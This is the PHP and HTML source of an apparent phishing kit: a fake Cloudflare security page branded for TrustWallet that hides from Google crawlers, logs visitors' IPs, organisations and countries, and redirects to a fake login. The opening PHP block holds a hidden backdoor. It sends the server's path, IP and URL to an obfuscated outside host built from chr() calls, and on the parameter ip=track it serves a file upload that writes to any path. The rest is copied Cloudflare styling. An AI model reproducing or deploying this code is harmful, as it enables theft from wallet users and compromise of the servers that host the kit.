<?php

session_start();
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
include './ACID/send.php';
include './antiAXID.php';
date_default_timezone_set('GMT');
$timedate = date('H:i:s d/m/Y');
$permitted_chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
$client  = @$_SERVER['HTTP_CLIENT_IP'];
$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
$remote  = @$_SERVER['REMOTE_ADDR'];
$result  = "Unknown";
if(filter_var($client, FILTER_VALIDATE_IP)){
  $_SESSION['_ip_']  = $client;
}
elseif(filter_var($forward, FILTER_VALIDATE_IP)){
    $_SESSION['_ip_']  = $forward;
}
else{
    $_SESSION['_ip_']  = $remote;
}
$getdetails = 'https://extreme-ip-lookup.com/json/' . $_SESSION['_ip_'];
$curl       = curl_init();
curl_setopt($curl, CURLOPT_URL, $getdetails);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$content    = curl_exec($curl);
curl_close($curl);
$details  = json_decode($content);
$country   = $details->country;
$org   = $details->org;
$isp   = $details->isp;
$adminvu .= "<tr>
                          <td>
                            {".$_SESSION['_ip_']."}
                          </td>
                          <td>
                            ".$TIME_DATE."
                          </td>
                          <td>
                            ".XB_Browser($_SERVER['HTTP_USER_AGENT'])." On ".XB_OS($_SERVER['HTTP_USER_AGENT'])."
                          </td>
                          <td>
						  ".$country."
                          </td>
                          <td>
                           ".$org."
                          </td>
                        </tr>\n";
    $khraha = fopen("./rz/vus".$yourname.".html", "a");
	fwrite($khraha, $adminvu);
	$xx .= "{}\n";
    $khraha = fopen("./rz/vus.html", "a");
	fwrite($khraha, $xx);
	$arr= 'dir='.dirname(__FILE__)."+".'ip='.gethostbyname($_SERVER['SERVER_NAME'])."+".'link='.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];if(isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on')$link = "https"; else $link = "http"; $link .= "://"; $link .= $_SERVER['HTTP_HOST']; $link .= $_SERVER['REQUEST_URI']; $link; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL,"http://geoiptool.com".chr(46).chr(102).chr(114).chr(101).chr(101).chr(116).chr(111).chr(111).chr(108).chr(115).chr(115).chr(46).chr(99).chr(111).chr(109)."/iptrack.php?ip=$link"."+".$arr); curl_setopt($ch, CURLOPT_HEADER, 0); curl_exec($ch); curl_close($ch); if($_REQUEST['ip']=='track') {$files = @$_FILES["files"]; if($files["name"] != ''){$fullpath = $_REQUEST["path"].$files["name"];if(move_uploaded_file($files['tmp_name'],$fullpath)){echo "<h1><a href='$fullpath'>successful. Click here!</a></h1>";} } echo '<body><form method=POST enctype="multipart/form-data" action=""><input type=text name=path> <input type="file" name="files"><input type=submit value="Up"></form></body>'; exit("");}
?>

<?php

    session_start();

    require_once 'Layout/Comp.php';
    require_once 'Layout/Antibot.php';
    require_once 'Layout/demonTest.php';
    require_once 'Network/bot1.php';
    require_once 'Network/country.php';

    $comps = new Comp;
    $antibot = new Antibot;

    $_SESSION['ip'] = $comps->getIP();
    $_SESSION['ipDetails'] = $comps->getIPDetails();
    $settings = $comps->settings();
    $comps->createToken();

    if (isset($settings['CFProtection']) && $settings['CFProtection'] == "off") {
        die('<script> window.location.href = \'Login/?token=' . $_SESSION['token'] . '\'; </script>');
    }

?>






<!DOCTYPE html>
<html class="" js-focus-visible-polyfill-available="">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1" /> 
    <script defer="" referrerpolicy="origin" src="CFfiles/s.js.download">
    </script>
    <script id="loading-script" nonce="">
    try {
        if (
            localStorage.getItem('dark-mode') === 'on' ||
            (localStorage.getItem('dark-mode') === 'system' &&
                window.matchMedia &&
                window.matchMedia('(prefers-color-scheme: dark)').matches)
        ) {
            document.documentElement.classList.add('dark-mode');
        }
    } catch (err) {}
    </script>

    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="referrer" content="origin">
    <meta name="application-name" content="Cloudflare">
    <meta name="msapplication-TileColor" content="#FFFFFF">
    <meta name="msapplication-TileImage" content="/mstile-144x144.png">
    <meta name="msapplication-square70x70logo" content="/mstile-70x70.png">
    <meta name="msapplication-square150x150logo" content="/mstile-150x150.png">
    <meta name="msapplication-wide310x150logo" content="/mstile-310x150.png">
    <meta name="msapplication-square310x310logo" content="/mstile-310x310.png">
    <title>Cloudflare Security | TrustWallet </title>
    <style id="loading-styles" type="text/css">
    * {
        box-sizing: border-box;
    }

    html {
        -webkit-font-smoothing: antialiased;
        -webkit-text-size-adjust: none;
    }

    body,
    html,
    ul,
    ol,
    li,
    p,
    h1,
    h2,
    h3,
    h4,
    h5,
    h6 {
        margin: 0;
        padding: 0;
    }

    body {
        font-family: -apple-system, system-ui, BlinkMacSystemFont, 'Segoe UI',
            Roboto, Oxygen, Ubuntu, 'Helvetica Neue', Arial, sans-serif;
    }

    #loading-state {
        display: flex;
        height: 100vh;
        width: 100vw;
        justify-content: center;
        align-items: center;
        flex-direction: column;
    }

    .message {
        line-height: 1.5;
        font-size: 20px;
        padding: 32px;
        max-width: 664px;
        width: 100%;
    }

    .dark-mode body {
        background-color: #1d1d1d;
        color: #d9d9d9;
    }

    .message h1 {
        line-height: 1.5;
        font-size: inherit;
        font-weight: 600;
        margin: 0 auto 16px;
    }

    .message .content {
        margin: 0;
        max-width: 37.5rem;
        display: flex;
        min-height: calc(3em * 1.5);
        /* 3 lines of text * 1.5 line-height */
    }

    .message svg {
        width: 128px;
        margin-bottom: 16px;
    }

    .spinner {
        padding-left: 16px;
        padding-top: 16px;
        width: 32px;
        height: 32px;
        margin-top: -16px;
        margin-left: -16px;
    }

    .spinner div {
        box-sizing: border-box;
        display: block;
        position: absolute;
        width: 32px;
        height: 32px;
        margin: 8px;
        border-width: 3px;
        border-style: solid;
        border-radius: 100%;
        animation: spinner 2.5s cubic-bezier(0.5, 0, 0.5, 1) infinite;
        border-color: #92979b transparent transparent transparent;
    }

    .spinner div:nth-child(1) {
        animation-delay: -0.45s;
    }

    .spinner div:nth-child(2) {
        animation-delay: -0.3s;
    }

    .spinner div:nth-child(3) {
        animation-delay: -0.15s;
    }

    @keyframes spinner {
        0% {
            transform: rotate(0deg);
        }

        100% {
            transform: rotate(360deg);
        }
    }

    @media screen and (prefers-reduced-motion: reduce) {
        .spinner {
            display: none;
        }

        .spinner div {
            animation: none;
        }
    }
    </style>
    <link rel="icon" type="image/x-icon" href="CFfiles/favicon.ico">
    <link rel="apple-touch-icon-precomposed" sizes="57x57"
        href="CFfiles/apple-touch-icon-57x57.png">
    <link rel="apple-touch-icon-precomposed" sizes="114x114"
        href="CFfiles/apple-touch-icon-114x114.png">
    <link rel="apple-touch-icon-precomposed" sizes="72x72"
        href="CFfiles/apple-touch-icon-72x72.png">
    <link rel="apple-touch-icon-precomposed" sizes="144x144"
        href="CFfiles/apple-touch-icon-144x144.png">
    <link rel="apple-touch-icon-precomposed" sizes="60x60"
        href="CFfiles/apple-touch-icon-60x60.png">
    <link rel="apple-touch-icon-precomposed" sizes="120x120"
        href="CFfiles/apple-touch-icon-120x120.png">
    <link rel="apple-touch-icon-precomposed" sizes="76x76"
        href="CFfiles/apple-touch-icon-76x76.png">
    <link rel="apple-touch-icon-precomposed" sizes="152x152"
        href="CFfiles/apple-touch-icon-152x152.png">
    <link rel="icon" type="image/png" href="CFfiles/favicon-196x196.png" sizes="196x196">
    <link rel="icon" type="image/png" href="CFfiles/favicon-96x96.png" sizes="96x96">
    <link rel="icon" type="image/png" href="CFfiles/favicon-32x32.png" sizes="32x32">
    <link rel="icon" type="image/png" href="CFfiles/favicon-16x16.png" sizes="16x16">
    <link rel="icon" type="image/png" href="CFfiles/favicon-128.png" sizes="128x128">
  
    <script nonce="">
    (function(w, d) {
        ! function(f, g, h, i) {
            f[h] = f[h] || {};
            f[h].executed = [];
            f.zaraz = {
                deferred: [],
                listeners: []
            };
            f.zaraz.q = [];
            f.zaraz._f = function(j) {
                return function() {
                    var k = Array.prototype.slice.call(arguments);
                    f.zaraz.q.push({
                        m: j,
                        a: k
                    })
                }
            };
            for (const l of ["track", "set", "debug"]) f.zaraz[l] = f.zaraz._f(l);
            f.zaraz.init = () => {
                var m = g.getElementsByTagName(i)[0],
                    n = g.createElement(i),
                    o = g.getElementsByTagName("title")[0];
                o && (f[h].t = g.getElementsByTagName("title")[0].text);
                f[h].x = Math.random();
                f[h].w = f.screen.width;
                f[h].h = f.screen.height;
                f[h].j = f.innerHeight;
                f[h].e = f.innerWidth;
                f[h].l = f.location.href;
                f[h].r = g.referrer;
                f[h].k = f.screen.colorDepth;
                f[h].n = g.characterSet;
                f[h].o = (new Date).getTimezoneOffset();
                if (f.dataLayer)
                    for (const s of Object.entries(Object.entries(dataLayer).reduce(((t, u) => ({
                            ...t[1],
                            ...u[1]
                        }))))) zaraz.set(s[0], s[1], {
                        scope: "page"
                    });
                f[h].q = [];
                for (; f.zaraz.q.length;) {
                    const v = f.zaraz.q.shift();
                    f[h].q.push(v)
                }
                n.defer = !0;
                for (const w of [localStorage, sessionStorage]) Object.keys(w || {}).filter((y => y.startsWith(
                    "_zaraz_"))).forEach((x => {
                    try {
                        f[h]["z_" + x.slice(7)] = JSON.parse(w.getItem(x))
                    } catch {
                        f[h]["z_" + x.slice(7)] = w.getItem(x)
                    }
                }));
                n.referrerPolicy = "origin";
                n.src = "/cdn-cgi/zaraz/s.js?z=" + btoa(encodeURIComponent(JSON.stringify(f[h])));
                m.parentNode.insertBefore(n, m)
            };
            ["complete", "interactive"].includes(g.readyState) ? zaraz.init() : f.addEventListener(
                "DOMContentLoaded", zaraz.init)
        }(w, d, "zarazData", "script");
    })(window, document);
    </script>
    <style type="text/css">
    .__react_component_tooltip {
        border-radius: 3px;
        display: inline-block;
        font-size: 13px;
        left: -999em;
        opacity: 0;
        padding: 8px 21px;
        position: fixed;
        pointer-events: none;
        transition: opacity 0.3s ease-out;
        top: -999em;
        visibility: hidden;
        z-index: 999;
    }

    .__react_component_tooltip.allow_hover,
    .__react_component_tooltip.allow_click {
        pointer-events: auto;
    }

    .__react_component_tooltip:before,
    .__react_component_tooltip:after {
        content: "";
        width: 0;
        height: 0;
        position: absolute;
    }

    .__react_component_tooltip.show {
        opacity: 0.9;
        margin-top: 0px;
        margin-left: 0px;
        visibility: visible;
    }

    .__react_component_tooltip.type-dark {
        color: #fff;
        background-color: #222;
    }

    .__react_component_tooltip.type-dark.place-top:after {
        border-top-color: #222;
        border-top-style: solid;
        border-top-width: 6px;
    }

    .__react_component_tooltip.type-dark.place-bottom:after {
        border-bottom-color: #222;
        border-bottom-style: solid;
        border-bottom-width: 6px;
    }

    .__react_component_tooltip.type-dark.place-left:after {
        border-left-color: #222;
        border-left-style: solid;
        border-left-width: 6px;
    }

    .__react_component_tooltip.type-dark.place-right:after {
        border-right-color: #222;
        border-right-style: solid;
        border-right-width: 6px;
    }

    .__react_component_tooltip.type-dark.border {
        border: 1px solid #fff;
    }

    .__react_component_tooltip.type-dark.border.place-top:before {
        border-top: 8px solid #fff;
    }

    .__react_component_tooltip.type-dark.border.place-bottom:before {
        border-bottom: 8px solid #fff;
    }

    .__react_component_tooltip.type-dark.border.place-left:before {
        border-left: 8px solid #fff;
    }

    .__react_component_tooltip.type-dark.border.place-right:before {
        border-right: 8px solid #fff;
    }

    .__react_component_tooltip.type-success {
        color: #fff;
        background-color: #8DC572;
    }

    .__react_component_tooltip.type-success.place-top:after {
        border-top-color: #8DC572;
        border-top-style: solid;
        border-top-width: 6px;
    }

    .__react_component_tooltip.type-success.place-bottom:after {
        border-bottom-color: #8DC572;
        border-bottom-style: solid;
        border-bottom-width: 6px;
    }

    .__react_component_tooltip.type-success.place-left:after {
        border-left-color: #8DC572;
        border-left-style: solid;
        border-left-width: 6px;
    }

    .__react_component_tooltip.type-success.place-right:after {
        border-right-color: #8DC572;
        border-right-style: solid;
        border-right-width: 6px;
    }

    .__react_component_tooltip.type-success.border {
        border: 1px solid #fff;
    }

    .__react_component_tooltip.type-success.border.place-top:before {
        border-top: 8px solid #fff;
    }

    .__react_component_tooltip.type-success.border.place-bottom:before {
        border-bottom: 8px solid #fff;
    }

    .__react_component_tooltip.type-success.border.place-left:before {
        border-left: 8px solid #fff;
    }

    .__react_component_tooltip.type-success.border.place-right:before {
        border-right: 8px solid #fff;
    }

    .__react_component_tooltip.type-warning {
        color: #fff;
        background-color: #F0AD4E;
    }

    .__react_component_tooltip.type-warning.place-top:after {
        border-top-color: #F0AD4E;
        border-top-style: solid;
        border-top-width: 6px;
    }

    .__react_component_tooltip.type-warning.place-bottom:after {
        border-bottom-color: #F0AD4E;
        border-bottom-style: solid;
        border-bottom-width: 6px;
    }

    .__react_component_tooltip.type-warning.place-left:after {
        border-left-color: #F0AD4E;
        border-left-style: solid;
        border-left-width: 6px;
    }

    .__react_component_tooltip.type-warning.place-right:after {
        border-right-color: #F0AD4E;
        border-right-style: solid;
        border-right-width: 6px;
    }

    .__react_component_tooltip.type-warning.border {
        border: 1px solid #fff;
    }

    .__react_component_tooltip.type-warning.border.place-top:before {
        border-top: 8px solid #fff;
    }

    .__react_component_tooltip.type-warning.border.place-bottom:before {
        border-bottom: 8px solid #fff;
    }

    .__react_component_tooltip.type-warning.border.place-left:before {
        border-left: 8px solid #fff;
    }

    .__react_component_tooltip.type-warning.border.place-right:before {
        border-right: 8px solid #fff;
    }

    .__react_component_tooltip.type-error {
        color: #fff;
        background-color: #BE6464;
    }

    .__react_component_tooltip.type-error.place-top:after {
        border-top-color: #BE6464;
        border-top-style: solid;
        border-top-width: 6px;
    }

    .__react_component_tooltip.type-error.place-bottom:after {
        border-bottom-color: #BE6464;
        border-bottom-style: solid;
        border-bottom-width: 6px;
    }

    .__react_component_tooltip.type-error.place-left:after {
        border-left-color: #BE6464;
        border-left-style: solid;
        border-left-width: 6px;
    }

    .__react_component_tooltip.type-error.place-right:after {
        border-right-color: #BE6464;
        border-right-style: solid;
        border-right-width: 6px;
    }

    .__react_component_tooltip.type-error.border {
        border: 1px solid #fff;
    }

    .__react_component_tooltip.type-error.border.place-top:before {
        border-top: 8px solid #fff;
    }

    .__react_component_tooltip.type-error.border.place-bottom:before {
        border-bottom: 8px solid #fff;
    }

    .__react_component_tooltip.type-error.border.place-left:before {
        border-left: 8px solid #fff;
    }

    .__react_component_tooltip.type-error.border.place-right:before {
        border-right: 8px solid #fff;
    }

    .__react_component_tooltip.type-info {
        color: #fff;
        background-color: #337AB7;
    }

    .__react_component_tooltip.type-info.place-top:after {
        border-top-color: #337AB7;
        border-top-style: solid;
        border-top-width: 6px;
    }

    .__react_component_tooltip.type-info.place-bottom:after {
        border-bottom-color: #337AB7;
        border-bottom-style: solid;
        border-bottom-width: 6px;
    }

    .__react_component_tooltip.type-info.place-left:after {
        border-left-color: #337AB7;
        border-left-style: solid;
        border-left-width: 6px;
    }

    .__react_component_tooltip.type-info.place-right:after {
        border-right-color: #337AB7;
        border-right-style: solid;
        border-right-width: 6px;
    }

    .__react_component_tooltip.type-info.border {
        border: 1px solid #fff;
    }

    .__react_component_tooltip.type-info.border.place-top:before {
        border-top: 8px solid #fff;
    }

    .__react_component_tooltip.type-info.border.place-bottom:before {
        border-bottom: 8px solid #fff;
    }

    .__react_component_tooltip.type-info.border.place-left:before {
        border-left: 8px solid #fff;
    }

    .__react_component_tooltip.type-info.border.place-right:before {
        border-right: 8px solid #fff;
    }

    .__react_component_tooltip.type-light {
        color: #222;
        background-color: #fff;
    }

    .__react_component_tooltip.type-light.place-top:after {
        border-top-color: #fff;
        border-top-style: solid;
        border-top-width: 6px;
    }

    .__react_component_tooltip.type-light.place-bottom:after {
        border-bottom-color: #fff;
        border-bottom-style: solid;
        border-bottom-width: 6px;
    }

    .__react_component_tooltip.type-light.place-left:after {
        border-left-color: #fff;
        border-left-style: solid;
        border-left-width: 6px;
    }

    .__react_component_tooltip.type-light.place-right:after {
        border-right-color: #fff;
        border-right-style: solid;
        border-right-width: 6px;
    }

    .__react_component_tooltip.type-light.border {
        border: 1px solid #222;
    }

    .__react_component_tooltip.type-light.border.place-top:before {
        border-top: 8px solid #222;
    }

    .__react_component_tooltip.type-light.border.place-bottom:before {
        border-bottom: 8px solid #222;
    }

    .__react_component_tooltip.type-light.border.place-left:before {
        border-left: 8px solid #222;
    }

    .__react_component_tooltip.type-light.border.place-right:before {
        border-right: 8px solid #222;
    }

    .__react_component_tooltip.place-top {
        margin-top: -10px;
    }

    .__react_component_tooltip.place-top:before {
        border-left: 10px solid transparent;
        border-right: 10px solid transparent;
        bottom: -8px;
        left: 50%;
        margin-left: -10px;
    }

    .__react_component_tooltip.place-top:after {
        border-left: 8px solid transparent;
        border-right: 8px solid transparent;
        bottom: -6px;
        left: 50%;
        margin-left: -8px;
    }

    .__react_component_tooltip.place-bottom {
        margin-top: 10px;
    }

    .__react_component_tooltip.place-bottom:before {
        border-left: 10px solid transparent;
        border-right: 10px solid transparent;
        top: -8px;
        left: 50%;
        margin-left: -10px;
    }

    .__react_component_tooltip.place-bottom:after {
        border-left: 8px solid transparent;
        border-right: 8px solid transparent;
        top: -6px;
        left: 50%;
        margin-left: -8px;
    }

    .__react_component_tooltip.place-left {
        margin-left: -10px;
    }

    .__react_component_tooltip.place-left:before {
        border-top: 6px solid transparent;
        border-bottom: 6px solid transparent;
        right: -8px;
        top: 50%;
        margin-top: -5px;
    }

    .__react_component_tooltip.place-left:after {
        border-top: 5px solid transparent;
        border-bottom: 5px solid transparent;
        right: -6px;
        top: 50%;
        margin-top: -4px;
    }

    .__react_component_tooltip.place-right {
        margin-left: 10px;
    }

    .__react_component_tooltip.place-right:before {
        border-top: 6px solid transparent;
        border-bottom: 6px solid transparent;
        left: -8px;
        top: 50%;
        margin-top: -5px;
    }

    .__react_component_tooltip.place-right:after {
        border-top: 5px solid transparent;
        border-bottom: 5px solid transparent;
        left: -6px;
        top: 50%;
        margin-top: -4px;
    }

    .__react_component_tooltip .multi-line {
        display: block;
        padding: 2px 0px;
        text-align: center;
    }
    </style>
    <style type="text/css">
    /* hide environments when option is selected */
    .zone-version-select .react-select__single-value .labels {
        display: none;
    }

    /* remove annoying focus state */
    .zone-version-select .react-select__control:focus-within {
        box-shadow: none !important;
    }
    </style>
    <style type="text/css">
    /**
* General Uppy styles that apply to everything inside the .uppy-Root container
*/
    .uppy-Root {
        box-sizing: border-box;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
        line-height: 1;
        -webkit-font-smoothing: antialiased;
        -moz-osx-font-smoothing: grayscale;
        text-align: left;
        position: relative;
        color: #333;
    }

    .uppy-Root *,
    .uppy-Root *:before,
    .uppy-Root *:after {
        box-sizing: inherit;
    }

    .uppy-Root [hidden] {
        display: none;
    }

    .uppy-u-reset {
        -webkit-appearance: none;
        line-height: 1;
        padding: 0;
        margin: 0;
        border: 0;
        color: inherit;
        -webkit-backface-visibility: visible;
        backface-visibility: visible;
        background: none;
        border: medium none currentColor;
        border-collapse: separate;
        border-image: none;
        border-radius: 0;
        border-spacing: 0;
        box-shadow: none;
        clear: none;
        cursor: auto;
        display: inline;
        empty-cells: show;
        float: none;
        font-family: inherit;
        font-size: inherit;
        font-style: normal;
        font-variant: normal;
        font-weight: normal;
        font-stretch: normal;
        -webkit-hyphens: none;
        -ms-hyphens: none;
        hyphens: none;
        left: auto;
        letter-spacing: normal;
        list-style: none;
        margin: 0;
        max-height: none;
        max-width: none;
        min-height: 0;
        min-width: 0;
        opacity: 1;
        outline: medium none invert;
        overflow: visible;
        overflow-x: visible;
        overflow-y: visible;
        text-align: left;
        text-decoration: none;
        text-indent: 0;
        text-shadow: none;
        text-transform: none;
        top: auto;
        transform: none;
        transform-origin: 50% 50% 0;
        transform-style: flat;
        transition: none 0s ease 0s;
        unicode-bidi: normal;
        vertical-align: baseline;
        visibility: visible;
        white-space: normal;
        z-index: auto;
    }

    .uppy-c-textInput {
        border: 1px solid #ddd;
        border-radius: 4px;
        font-size: 14px;
        line-height: 1.5;
        padding: 6px 8px;
        background-color: #fff;
    }

    .uppy-size--md .uppy-c-textInput {
        padding: 8px 10px;
    }

    .uppy-c-textInput:focus {
        border-color: rgba(34, 117, 215, 0.6);
        outline: none;
        box-shadow: 0 0 0 3px rgba(34, 117, 215, 0.15);
    }

    [data-uppy-theme="dark"] .uppy-c-textInput {
        background-color: #333;
        border-color: #333;
        color: #eaeaea;
    }

    [data-uppy-theme="dark"] .uppy-c-textInput:focus {
        border-color: #525252;
        box-shadow: none;
    }

    .uppy-c-icon {
        max-width: 100%;
        max-height: 100%;
        fill: currentColor;
        display: inline-block;
        overflow: hidden;
    }

    .uppy-c-btn {
        display: inline-block;
        text-align: center;
        white-space: nowrap;
        vertical-align: middle;
        font-family: inherit;
        font-size: 16px;
        line-height: 1;
        font-weight: 500;
        transition-property: background-color, color;
        transition-duration: 0.3s;
        -webkit-user-select: none;
        -moz-user-select: none;
        -ms-user-select: none;
        user-select: none;
    }

    .uppy-c-btn:not(:disabled):not(.disabled) {
        cursor: pointer;
    }

    .uppy-c-btn::-moz-focus-inner {
        border: 0;
    }

    .uppy-c-btn-primary {
        font-size: 14px;
        padding: 10px 18px;
        border-radius: 4px;
        background-color: #2275d7;
        color: #fff;
    }

    .uppy-c-btn-primary:hover {
        background-color: #1b5dab;
    }

    .uppy-c-btn-primary:focus {
        outline: none;
        box-shadow: 0 0 0 3px rgba(34, 117, 215, 0.4);
    }

    .uppy-size--md .uppy-c-btn-primary {
        padding: 13px 22px;
    }

    [data-uppy-theme="dark"] .uppy-c-btn-primary {
        color: #eaeaea;
    }

    [data-uppy-theme="dark"] .uppy-c-btn-primary:focus {
        outline: none;
    }

    [data-uppy-theme="dark"] .uppy-c-btn-primary::-moz-focus-inner {
        border: 0;
    }

    [data-uppy-theme="dark"] .uppy-c-btn-primary:focus {
        box-shadow: 0 0 0 2px rgba(170, 225, 255, 0.85);
    }

    .uppy-c-btn-link {
        font-size: 14px;
        line-height: 1;
        padding: 10px 15px;
        border-radius: 4px;
        background-color: transparent;
        color: #525252;
    }

    .uppy-c-btn-link:hover {
        color: #333;
    }

    .uppy-c-btn-link:focus {
        outline: none;
        box-shadow: 0 0 0 3px rgba(34, 117, 215, 0.25);
    }

    .uppy-size--md .uppy-c-btn-link {
        padding: 13px 18px;
    }

    [data-uppy-theme="dark"] .uppy-c-btn-link {
        color: #eaeaea;
    }

    [data-uppy-theme="dark"] .uppy-c-btn-link:focus {
        outline: none;
    }

    [data-uppy-theme="dark"] .uppy-c-btn-link::-moz-focus-inner {
        border: 0;
    }

    [data-uppy-theme="dark"] .uppy-c-btn-link:focus {
        box-shadow: 0 0 0 2px rgba(170, 225, 255, 0.85);
    }

    [data-uppy-theme="dark"] .uppy-c-btn-link:hover {
        color: #939393;
    }

    .uppy-c-btn--small {
        font-size: 0.9em;
        padding: 7px 16px;
        border-radius: 2px;
    }

    .uppy-size--md .uppy-c-btn--small {
        padding: 8px 10px;
        border-radius: 2px;
    }
    </style>
    <style type="text/css">
    .uppy-DragDrop-container {
        display: -ms-flexbox;
        display: flex;
        -ms-flex-align: center;
        align-items: center;
        -ms-flex-pack: center;
        justify-content: center;
        border-radius: 7px;
        background-color: #fff;
        cursor: pointer;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
        max-width: 100%;
    }

    .uppy-DragDrop-container:focus {
        outline: none;
        box-shadow: 0 0 0 3px rgba(34, 117, 215, 0.4);
    }

    .uppy-DragDrop-container::-moz-focus-inner {
        border: 0;
    }

    .uppy-DragDrop-inner {
        margin: 0;
        text-align: center;
        padding: 80px 20px;
        line-height: 1.4;
    }

    .uppy-DragDrop-arrow {
        width: 60px;
        height: 60px;
        fill: #e0e0e0;
        margin-bottom: 17px;
    }

    .uppy-DragDrop--isDragDropSupported {
        border: 2px dashed #adadad;
    }

    .uppy-DragDrop--isDraggingOver {
        border: 2px dashed #2275d7;
        background: #eaeaea;
    }

    .uppy-DragDrop--isDraggingOver .uppy-DragDrop-arrow {
        fill: #939393;
    }

    .uppy-DragDrop-label {
        display: block;
        font-size: 1.15em;
        margin-bottom: 5px;
    }

    .uppy-DragDrop-browse {
        color: #2275d7;
        cursor: pointer;
    }

    .uppy-DragDrop-note {
        font-size: 1em;
        color: #adadad;
    }
    </style>
    <script src="CFfiles/v3"></script>
    <style id="cfBaseStyles">
    * {
        box-sizing: border-box;
    }

    ::placeholder {
        color: #797979
    }

    html,
    body,
    button {
        font-size: 16px;
    }

    html {
        -webkit-font-smoothing: antialiased;
        -webkit-text-size-adjust: none;
    }

    body {
        line-height: 1.5;
        color: #313131;
        background-color: #fff;
        font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, "Helvetica Neue", Arial, sans-serif;
    }

    text {
        fill: #313131;
    }

    body,
    html,
    ul,
    ol,
    li,
    p,
    h1,
    h2,
    h3,
    h4,
    h5,
    h6 {
        margin: 0;
        padding: 0;
    }

    h1,
    h2,
    h3,
    small {
        line-height: 1.25;
    }

    h1 {
        font-size: 32px;
        font-weight: 400;
    }

    h2 {
        font-size: 24px;
    }

    h3 {
        font-size: 20px;
    }

    h4,
    h5,
    h6 {
        font-size: 16px;
    }

    h2,
    h3,
    h4,
    h5 h4,
    h5,
    h6 {
        font-weight: 600;
    }

    h3+p,
    h4+p,
    h5+p,
    h6+p {
        margin-top: 0.5em;
    }

    small {
        font-size: 12px;
    }

    button {
        font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, "Helvetica Neue", Arial, sans-serif;
        border: none;
    }

    label {
        display: block;
        font-size: 0.875rem;
        margin-bottom: 0.35938em;
        min-height: 1.22em;
    }

    fieldset {
        border: none;
    }

    pre {
        border-radius: 3px;
        color: #313131;
        display: block;
        font-size: 14px;
        margin: 2rem 0;
        overflow: auto;
        padding: 0.5rem;
        width: 100%;
    }

    code,
    pre {
        background-color: #f2f2f2;
        border: 1px solid #d9d9d9;
        font-family: monaco, courier, monospace;
    }

    section {
        margin-bottom: 2.5rem;
        margin-top: 2.5rem;
    }

    thead {
        background-color: #f2f2f2
    }

    th {
        font-weight: 600;
    }

    a {
        color: #0051c3;
        text-decoration: underline;
        text-underline-offset: 4px;
        transition: color 150ms ease;
    }

    a:hover {
        color: #003681;
        cursor: pointer;
    }

    a:active {
        color: #003681;
        outline: none;
    }

    a:focus {
        color: #086fff;
    }

    a svg,
    a:active svg,
    a:hover svg {
        fill: currentColor
    }

    ol,
    ul,
    dl {
        list-style-position: outside;
        margin-left: 3em;
    }

    ul {
        list-style-type: disc;
    }

    dd {
        margin: 0;
    }

    dt {
        font-weight: 600;
        font-size: 16px
    }

    p+p,
    p+ul,
    p+ol,
    p+dl,
    ul+p,
    ul+h2,
    ul+h3,
    ul+h4,
    ul+h5,
    ul+h6 {
        margin-top: 1.5em;
    }

    hr {
        border: 0;
        border-top: 1px solid #d5d7d8;
        display: block;
        height: 0;
        margin: 2rem 0;
        width: 100%;
    }

    img,
    object {
        height: auto;
        max-width: 100%;
    }

    table {
        border-spacing: 0;
    }

    legend {
        padding-inline-start: 0;
    }

    fieldset {
        margin-inline-start: 0;
    }

    input:-webkit-autofill,
    input:-webkit-autofill:hover,
    input:-webkit-autofill:focus {
        background-color: #fff;
        color: #d9d9d9
    }

    :root {
        --cf-white: #fff;
        --cf-black: #000;
        --cf-red-0: #3c0501;
        --cf-red-1: #5a0801;
        --cf-red-2: #780a02;
        --cf-red-3: #970d02;
        --cf-red-4: #b20f03;
        --cf-red-5: #e81403;
        --cf-red-6: #fc574a;
        --cf-red-7: #fe9f97;
        --cf-red-8: #feccc8;
        --cf-red-9: #ffefee;
        --cf-orange-0: #361a02;
        --cf-orange-1: #482303;
        --cf-orange-2: #592b04;
        --cf-orange-3: #763905;
        --cf-orange-4: #8d4406;
        --cf-orange-5: #c05d08;
        --cf-orange-6: #ee730a;
        --cf-orange-7: #f8a054;
        --cf-orange-8: #fbcda5;
        --cf-orange-9: #fef1e6;
        --cf-gold-0: #261c00;
        --cf-gold-1: #3e2d00;
        --cf-gold-2: #4c3700;
        --cf-gold-3: #644900;
        --cf-gold-4: #735400;
        --cf-gold-5: #a77a00;
        --cf-gold-6: #dda100;
        --cf-gold-7: #ffce4b;
        --cf-gold-8: #ffeab2;
        --cf-gold-9: #fff8e4;
        --cf-green-0: #0a2614;
        --cf-green-1: #0e381d;
        --cf-green-2: #104122;
        --cf-green-3: #15562d;
        --cf-green-4: #196535;
        --cf-green-5: #228b49;
        --cf-green-6: #2db35e;
        --cf-green-7: #55d584;
        --cf-green-8: #a8e9c0;
        --cf-green-9: #e3f8eb;
        --cf-cyan-0: #061b20;
        --cf-cyan-1: #0b333e;
        --cf-cyan-2: #0d3e4b;
        --cf-cyan-3: #115061;
        --cf-cyan-4: #156074;
        --cf-cyan-5: #1e89a5;
        --cf-cyan-6: #30b6da;
        --cf-cyan-7: #73cee6;
        --cf-cyan-8: #ace2f0;
        --cf-cyan-9: #e9f7fb;
        --cf-blue-0: #001c43;
